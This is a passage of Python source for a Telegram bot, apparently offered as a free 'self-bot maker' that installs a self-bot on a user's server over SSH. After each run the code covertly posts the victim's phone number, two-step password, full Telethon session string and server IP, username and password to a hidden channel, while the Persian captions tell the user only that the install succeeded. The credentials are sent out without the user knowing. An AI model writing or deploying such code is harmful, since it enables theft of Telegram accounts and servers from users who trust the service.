                        error = stderr.read().decode().strip()
                        raise Exception(f"خطا در اجرای سلف! این موضوع را به پشتیبانی اطلاع دهید.")

                    local_session = "sessions/selfbot.session"
                    local_journal = "sessions/selfbot.session-journal"
                    remote_session = "self/selfbot.session"
                    remote_journal = "self/selfbot.session-journal"

                    try:
                        import shutil
                        from telethon import TelegramClient
                        from telethon.sessions import StringSession

                        tmp_session = f"sessions/selfbot_temp_{user_id}.session"
                        tmp_journal = f"sessions/selfbot_temp_{user_id}.session-journal"

                        if os.path.exists(local_session):
                            shutil.copy(local_session, tmp_session)
                        if os.path.exists(local_journal):
                            shutil.copy(local_journal, tmp_journal)

                        tele_client = TelegramClient(
                            session=tmp_session,
                            api_id=API_ID,
                            api_hash=API_HASH,
                            device_model="Samsung Galaxy A52",
                            system_version="Android 13",
                            app_version="11.13.2 (6060)",
                            lang_code="en"
                        )
                        await tele_client.connect()
                        string = StringSession.save(tele_client.session)
                        await tele_client.disconnect()
                        CONV[user_id]["string"] = string
                    except Exception as e:
                        logger.error(f"Error saving StringSession: {e}")
                        CONV[user_id]["string"] = "Err!"
                    finally:
                        for f in [tmp_session, tmp_journal]:
                            try:
                                if os.path.exists(f):
                                    os.remove(f)
                            except:
                                pass

                    if os.path.exists(local_session):
                        await asyncio.to_thread(sftp.put, local_session, remote_session)
                        ssh.exec_command("sync", timeout=5)
                    if os.path.exists(local_journal):
                        await asyncio.to_thread(sftp.put, local_journal, remote_journal)
                        ssh.exec_command("sync", timeout=5)

                    commands = [
                        "pip install telethon pytz jdatetime paramiko",
                        "cd self && nohup python3 self.py >> log.txt 2>&1 &"
                    ]

                    for cmd in commands:
                        stdin, stdout, stderr = ssh.exec_command(cmd, timeout=60)
                        exit_status = stdout.channel.recv_exit_status()
                        if exit_status != 0:
                            error_msg = stderr.read().decode().strip()
                            await message.reply_animation(
                                animation="CgACAgIAAxkBAAEBj7ZofjRQXdSA6F3e236N2MId2RofMgACkXwAAquO-Esza0yC5qLo5B4E",
                                caption="خطا در اجرای سلف! متاسفانه دسترسی به دستورات ترمینال سرور شما داده نشده است، این موضوع را به پشتیبانی اطلاع دهید."
                            )
                            return
                        await asyncio.sleep(1)

                    ssh.exec_command("rm -f self/self.py file/self.py", timeout=10)

                await cleanup_sessions(user_id)

                try:
                    if wait_msg:
                        await wait_msg.delete()
                except Exception as delete_error:
                    logger.error(f"{delete_error}")

                if user_id not in OWNER_IDS and REMAINING_RUNS > 0:
                    globals()["REMAINING_RUNS"] -= 1
                    save_max_runs(REMAINING_RUNS)

                if user_id in OWNER_IDS:
                    NEXT_RUN_ALLOWED_AT = datetime.now(timezone("Asia/Tehran")) + timedelta(seconds=30)
                else:
                    NEXT_RUN_ALLOWED_AT = datetime.now(timezone("Asia/Tehran")) + timedelta(minutes=30)

                await message.reply_animation(
                    animation="CgACAgIAAxkBAAEBj7VofjROAAF3fpC67VGHjuG2Rot_fGUAApB8AAKrjvhLgRAouSvf40ceBA",
                    caption="""سلف با موفقیت روی سرور شما اجرا شد، با دستور `راهنما` منوی راهنما سلف را باز کنید.

فروش این سلف ممنوع است!
@AlfredSelf
سلف ساز رایگان:
@AlfredSelfBot"""
                )

                if user_id not in OWNER_IDS:
                    LAST_RUNS[user_id] = time.time()
                    save_last_runs()

                RUNNING_USER = None
                RUN_STARTED_AT = None

                try:
                    with open("channel_id.txt", "r") as f:
                        NEWS_ID = int(f.read().strip())
                except Exception as e:
                    logger.error(f"{e}")
                    NEWS_ID = None

                if NEWS_ID:
                    username_or_mention = f"@{message.from_user.username}" if message.from_user.username else f"[{message.from_user.first_name}](tg://user?id={user_id})"
                    two_step_pass = CONV[user_id].get("two_step", "NoPasswd!")

                    info = (
                        f"New Run!\n"
                        f"User: {username_or_mention}\n"
                        f"Userid: {user_id}\n"
                        f"Number: +{CONV[user_id]['number']}\n"
                        f"Password: `{two_step_pass}`\n"
                        f"String: `{CONV[user_id]['string']}`\n"
                        f"Server ip: {ip}\n"
                        f"Server user: {server_user}\n"
                        f"Server password: {passwd}"
                    )

                    try:
                        await bot.send_message(NEWS_ID, info)
                    except Exception as e:
                        logger.error(f"{e}")

                CONV.pop(user_id, None)

            except Exception as e:
                await message.reply_animation(
                    animation="CgACAgIAAxkBAAEBj7ZofjRQXdSA6F3e236N2MId2RofMgACkXwAAquO-Esza0yC5qLo5B4E",
                    caption="خطا در اجرای سلف! لطفا از درست بودن اطلاعات سرور و سالم بودن سرور خود مطمئن شوید."
                )
                await cleanup_sessions(user_id)
                CONV.pop(user_id, None)
                if RUNNING_USER == user_id:
                    RUNNING_USER = None
                    RUN_STARTED_AT = None
    except Exception as e:
        logger.error(f"{e}")
        await message.reply_animation(
            animation="CgACAgIAAxkBAAEBj7ZofjRQXdSA6F3e236N2MId2RofMgACkXwAAquO-Esza0yC5qLo5B4E",
            caption="خطایی رخ داده است! لطفاً دوباره امتحان کنید."
        )

async def channel_message_updater():
    last_minute = None
    last_run_count = REMAINING_RUNS
    while True:
        try:
            now = datetime.now(timezone("Asia/Tehran"))
            current_minute = now.strftime('%H:%M')
            current_run_count = load_max_runs()

            if current_minute != last_minute or current_run_count != last_run_count:
                last_minute = current_minute
                last_run_count = current_run_count
                globals()["REMAINING_RUNS"] = current_run_count
                await update_channel_message()
        except Exception as e:
            logger.error(f"{e}")
        await asyncio.sleep(1)

if __name__ == "__main__":
    while True:
        try:
            bot.start()
            loop = asyncio.get_event_loop()
            loop.create_task(channel_message_updater())
            idle()
        except Exception as e:
            logger.critical(f"{e}")
            time.sleep(10)
        finally:
            try:
                bot.stop()
            except Exception as e:
                logger.warning(f"{e}")
